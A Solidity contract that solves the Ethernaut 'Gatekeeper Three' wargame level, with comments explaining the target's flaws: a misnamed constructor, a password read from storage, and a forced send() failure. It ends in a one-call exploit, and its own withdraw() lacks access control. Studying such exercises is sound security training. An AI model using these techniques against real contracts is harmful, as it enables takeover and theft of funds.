// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * @title GatekeeperThreeAttack
 * @dev Exploit contract for Ethernaut Level 28 - Gatekeeper Three
 * 
 * VULNERABILITY EXPLANATION:
 * ========================
 * The GatekeeperThree contract has multiple vulnerabilities:
 * 
 * 1. TYPO IN CONSTRUCTOR:
 *    - The function is named construct0r() (with a zero) instead of constructor()
 *    - This makes it a regular public function instead of a constructor
 *    - Anyone can call it to become the owner!
 * 
 * 2. GATE ONE: Owner Check + Origin Check
 *    - Requires: msg.sender == owner
 *    - Requires: tx.origin != owner
 *    - Solution: Become owner, then call from a contract
 * 
 * 3. GATE TWO: AllowEntrance Flag
 *    - Requires: allowEntrance == true
 *    - Set by calling getAllowance() with correct password
 *    - Password is stored in SimpleTrick (slot 2)
 *    - Password = block.timestamp when SimpleTrick was created
 *    - We can read it directly from storage!
 * 
 * 4. GATE THREE: ETH Balance + Send Failure
 *    - Requires: contract balance > 0.001 ether
 *    - Requires: payable(owner).send(0.001 ether) == false
 *    - Solution: Send ETH to contract, then make owner (us) revert on receive
 *    - Our attack contract will revert in receive() to fail the send()
 * 
 * STORAGE LAYOUT of SimpleTrick:
 * ==============================
 * Slot 0: target (GatekeeperThree address)
 * Slot 1: trick (address)
 * Slot 2: password (uint256) - This is what we need!
 */

interface IGatekeeperThree {
    function construct0r() external;
    function createTrick() external;
    function getAllowance(uint256 _password) external;
    function enter() external;
    function trick() external view returns (address);
    function owner() external view returns (address);
    function allowEntrance() external view returns (bool);
}

contract GatekeeperThreeAttack {
    IGatekeeperThree public target;
    
    // Flag to control whether we revert on receive
    bool public shouldRevert = true;
    
    constructor(address _target) {
        target = IGatekeeperThree(_target);
    }
    
    /**
     * @dev Step 1: Become the owner by exploiting the typo
     * The function is construct0r() not constructor(), so it's callable by anyone
     */
    function becomeOwner() external {
        target.construct0r();
    }
    
    /**
     * @dev Step 2: Create the SimpleTrick instance
     * This is needed to set up the password check
     */
    function setupTrick() external {
        target.createTrick();
    }
    
    /**
     * @dev Step 3: Pass Gate Two with the correct password
     * The password must be read from SimpleTrick storage (slot 2) using web3/ethers
     * Password = block.timestamp when SimpleTrick was created
     * @param password The password read from SimpleTrick contract storage
     */
    function passGateTwo(uint256 password) external {
        // Call getAllowance with the password to set allowEntrance = true
        target.getAllowance(password);
    }
    
    /**
     * @dev Step 4: Send ETH to the target to satisfy balance requirement
     * Gate Three requires balance > 0.001 ether
     */
    function fundTarget() external payable {
        require(msg.value > 0.001 ether, "Need to send > 0.001 ether");
        payable(address(target)).transfer(msg.value);
    }
    
    /**
     * @dev Step 5: Execute the final attack to pass all gates and enter
     * 
     * Gate One: ✓ msg.sender (this contract) == owner (this contract)
     *           ✓ tx.origin (EOA) != owner (this contract)
     * Gate Two: ✓ allowEntrance == true (set by passGateTwo)
     * Gate Three: ✓ balance > 0.001 ether (sent by fundTarget)
     *             ✓ owner.send() fails (we revert in receive)
     */
    function attack() external {
        // Make sure we revert on receive to fail gate three's send()
        shouldRevert = true;
        
        // Call enter() - this should pass all three gates
        target.enter();
    }
    
    /**
     * @dev Complete attack in one transaction
     * This combines all steps for convenience
     * @param password The password read from SimpleTrick contract storage (use script to get it)
     */
    function completeAttack(uint256 password) external payable {
        // Step 1: Become owner
        target.construct0r();
        
        // Step 2: Create trick
        target.createTrick();
        
        // Step 3: Pass gate two with password
        target.getAllowance(password);
        
        // Step 4: Fund the target
        require(msg.value > 0.001 ether, "Send > 0.001 ether with this call");
        payable(address(target)).transfer(msg.value);
        
        // Step 5: Enter
        shouldRevert = true;
        target.enter();
    }
    

    
    /**
     * @dev Revert on receiving ETH to fail gate three's send()
     * Gate Three checks: payable(owner).send(0.001 ether) == false
     * By reverting here, the send() will return false, passing the gate
     */
    receive() external payable {
        if (shouldRevert) {
            revert("Reverting to fail send() in gate three");
        }
    }
    
    /**
     * @dev Allow withdrawing ETH if needed (when shouldRevert is false)
     */
    function toggleRevert() external {
        shouldRevert = !shouldRevert;
    }
    
    /**
     * @dev Withdraw any ETH from this contract
     */
    function withdraw() external {
        shouldRevert = false;
        payable(msg.sender).transfer(address(this).balance);
    }
    
    /**
     * @dev Get current state for debugging
     */
    function getState() external view returns (
        address owner,
        bool allowEntrance,
        address trickAddr,
        uint256 targetBalance,
        address currentOwner
    ) {
        owner = target.owner();
        allowEntrance = target.allowEntrance();
        trickAddr = target.trick();
        targetBalance = address(target).balance;
        currentOwner = address(this);
    }
}
